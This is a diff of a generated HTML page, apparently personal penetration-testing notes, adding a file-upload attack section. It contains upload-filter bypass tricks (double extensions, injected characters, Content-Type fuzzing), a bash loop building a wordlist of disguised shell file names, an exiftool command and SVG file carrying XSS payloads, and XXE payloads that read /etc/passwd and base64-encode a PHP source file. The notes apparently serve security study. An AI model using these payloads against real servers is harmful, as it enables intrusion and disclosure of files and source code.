@@ -650,6 +650,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creating-character-injection-wordlist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating Character Injection Wordlist
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#limiting-content-type-wordlist-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Limiting Content-Type wordlist example
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -658,6 +682,30 @@
       Limited Uploads
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Limited Uploads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1164,6 +1212,30 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Bypasses">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#creating-character-injection-wordlist" class="md-nav__link">
+    <span class="md-ellipsis">
+      Creating Character Injection Wordlist
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#limiting-content-type-wordlist-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Limiting Content-Type wordlist example
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1172,6 +1244,30 @@
       Limited Uploads
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Limited Uploads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      XXE
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1259,7 +1355,7 @@
 <td>Load browser console to review JS functions by typing their name in</td>
 </tr>
 <tr>
-<td><strong>Blacklist Bypass</strong></td>
+<td><strong>Blacklist Bypass (Can terst in burp intruder tab(may need to diable URL encoding))</strong></td>
 <td></td>
 </tr>
 <tr>
@@ -1283,7 +1379,7 @@
 <td>List of Web Extensions</td>
 </tr>
 <tr>
-<td><strong>Whitelist Bypass</strong></td>
+<td><strong>Whitelist Bypass (try fuzzing with web exstentions wordlist first to see what are accepted)</strong></td>
 <td></td>
 </tr>
 <tr>
@@ -1292,14 +1388,14 @@
 </tr>
 <tr>
 <td><code>shell.php.jpg</code></td>
-<td>Reverse Double Extension</td>
+<td>Reverse Double Extension (works when missconfigured webserver will execute because contains php and whitelist allows jpg (may need fuzzing php ext also (php7.jpg etc)))</td>
 </tr>
 <tr>
 <td><code>%20, %0a, %00, %0d0a, /, .\, ., …</code></td>
 <td>Character Injection - Before/After Extension</td>
 </tr>
 <tr>
-<td><strong>Content/Type Bypass</strong></td>
+<td><strong>Content/Type Bypass (Content-Type header check), fuzz contrent type in burp</strong></td>
 <td></td>
 </tr>
 <tr>
@@ -1308,11 +1404,30 @@
 </tr>
 <tr>
 <td><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signatures</a></td>
-<td>List of File Signatures/Magic Bytes</td>
+<td>List of File Signatures/<a href="https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime">Magic Bytes</a> (first bytes of a file indicate its MIME-type)</td>
 </tr>
 </tbody>
 </table>
+<p><strong>Note:</strong> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.</p>
+<h3 id="creating-character-injection-wordlist">Creating Character Injection Wordlist</h3>
+<pre><code class="language-bash">for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do # can add more php ext here
+        echo &quot;shell$char$ext.jpg&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell$ext$char.jpg&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell.jpg$char$ext&quot; &gt;&gt; wordlist.txt
+        echo &quot;shell.jpg$ext$char&quot; &gt;&gt; wordlist.txt
+    done
+done
+</code></pre>
+<h3 id="limiting-content-type-wordlist-example">Limiting Content-Type wordlist example</h3>
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+cat web-all-content-types.txt | grep 'image/' &gt; image-content-types.txt
+</code></pre>
 <h2 id="limited-uploads">Limited Uploads</h2>
+<ul>
+<li>Secure filters not exploitable with above techniques</li>
+<li>Fuzz file extensions to try below techniques</li>
+</ul>
 <table>
 <thead>
 <tr>
@@ -1335,6 +1450,43 @@
 </tr>
 </tbody>
 </table>
+<h3 id="xss">XSS</h3>
+<ul>
+<li>Adding XSS payload to an image's metadata:</li>
+</ul>
+<pre><code class="language-bash">exiftool -Comment=' &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg
+exiftool HTB.jpg
+</code></pre>
+<ul>
+<li>Change the image's MIME-Type to text/html, web apps may show it as an HTML document instead of an image, thus the XSS payload would be triggered.</li>
+<li>Scalable Vector Graphics (SVG) images are XML-based. For this reason, we can modify their XML data to include an XSS payload: </li>
+</ul>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1&quot; height=&quot;1&quot;&gt;
+    &lt;rect x=&quot;1&quot; y=&quot;1&quot; width=&quot;1&quot; height=&quot;1&quot; fill=&quot;green&quot; stroke=&quot;black&quot; /&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;alert(window.origin);&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<h3 id="xxe">XXE</h3>
+<ul>
+<li>SVG/XML example:</li>
+</ul>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
+</code></pre>
+<ul>
+<li>Another example but to read the web apps source code:</li>
+</ul>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
+</code></pre>
+<ul>
+<li>View page source of the upload page to see the returned file from abpve payload.</li>
+<li>PDF, Word Documents, PowerPoint Documents all include XML elements.</li>
+</ul>
 
 
 
